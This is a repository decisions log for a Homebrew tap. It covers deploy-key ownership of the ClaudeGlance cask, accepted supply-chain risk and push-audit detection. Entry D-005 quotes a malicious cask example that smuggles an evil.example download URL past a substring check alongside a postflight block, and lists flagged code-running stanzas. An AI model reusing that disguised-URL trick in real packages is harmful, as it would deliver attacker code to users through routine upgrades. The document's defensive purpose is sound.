# Decisions

Append only. Supersede, never rewrite.

## D-001 (2026-06-10): cask token is `claudeglance`

The app was rebranded from claude-usage-systray to ClaudeGlance. The old cask was removed rather than kept as an alias, since there were no outside users yet.

## D-002 (2026-09-27): the source repo's release job owns the cask

`Casks/claudeglance.rb` is generated by workshop144/claudeglance `release.yml` and pushed to `main` with a write deploy key scoped to this repo. The private key lives only as `HOMEBREW_TAP_DEPLOY_KEY` in the source repo, in a job with `permissions: {}` that shares no runner with the build. A missing key degrades to a warning, not a failed release. Consequence: hand edits to the cask are overwritten; change the template instead.

## D-003 (2026-11-06): no required checks on `main`

Because D-002 pushes directly to `main`, `main` only blocks force-push and deletion. The STATE guard runs on pull requests, not as a required check on pushes.

## D-004 (2026-11-07): accept the write deploy key's reach; alert after, rotate yearly

Whoever holds `HOMEBREW_TAP_DEPLOY_KEY` can push any file to `main` (D-002, D-003), including a cask with a new `url` and `sha256` or a changed workflow, and the next `brew upgrade` installs it. Nothing on this side can block that push: GitHub push rulesets (path restrictions) exist only for organization-owned repositories, and this tap is on a personal account; required checks or PR-only rules would also block the release job. Accepted because the key lives only in a `permissions: {}` job in workshop144/claudeglance that shares no runner with the build. Mitigations: the `tests` workflow runs on every push to `main` and fails on a non-workshop144 URL, and its `alert` job opens an issue on that failure so the owner is notified even if Actions emails are off (it cannot catch a push that also rewrites the workflow). The key is rotated at least yearly; next rotation due by 2027-09-27 (created 2026-09-27). On a suspicious bot commit: revert it, delete the deploy key, and issue a new one.

## D-005 (2026-11-07): detect a bad deploy-key push by template and provenance, not by URL substring

Refines D-004 (the accepted risk and the yearly rotation stand). Review 2026-11-07 r2 (M1) showed the D-004 alert missed a malicious cask: the URL test was a substring match, so `url "https://evil.example/x?https://github.com/workshop144/claudeglance/releases/download/v#{version}/ClaudeGlance.dmg"` plus a `postflight` block passed, and nothing checked the other stanzas, the version direction, or which files a bot-titled push touched. Decision:

- The cask must equal a committed template with only `version` (tag rule) and `sha256` (64 lower-case hex) filled in: `tests/fixtures/claudeglance.adhoc.rb.tmpl` (today's ad-hoc signed build, with `caveats`) or `claudeglance.notarized.rb.tmpl` (no `caveats`). Both were rendered from the `FORMULA` in workshop144/claudeglance release.yml (main 9d485f9) and match it byte for byte. `scripts/check-cask-template.sh` also names code-running stanzas and shell-outs (`preflight`, `postflight`, `installer`, `system`, backticks, `%x`, ...) and requires the URL to be exactly the workshop144 release URL. When the release.yml template changes, update the fixtures here first, or the next bot bump raises the alert (fail loud, never silent).
- On every push to `main`, `scripts/audit-push.sh` (job `push-audit`) checks each new commit: it passes only if GitHub reports it verified with committer `web-flow` (a PR merged on GitHub; the deploy key cannot produce these), or if it is a bot bump: subject `Update claudeglance to X`, one parent, only `Casks/claudeglance.rb` changed, cask version equals X and is strictly higher than the parent's (`sort -V`). A failed lookup fails closed. Direct pushes by people therefore raise the alert too; human changes go through PRs (CLAUDE.md).
- Residual, accepted (Low): the checks run from the pushed commit, so a push that rewrites `tests.yml`, `tests/run.sh` or `scripts/` in the same push can disable them. Nothing inside this personal-account repo can prevent that (no push rulesets, D-004). Closing it needs a watcher outside the repo that runs a trusted copy of `audit-push.sh` against `main` (for example an hourly job on the homelab or a scheduled workflow in another repo the deploy key cannot write). Until then the yearly key rotation and the key's isolation in a `permissions: {}` job are the controls.
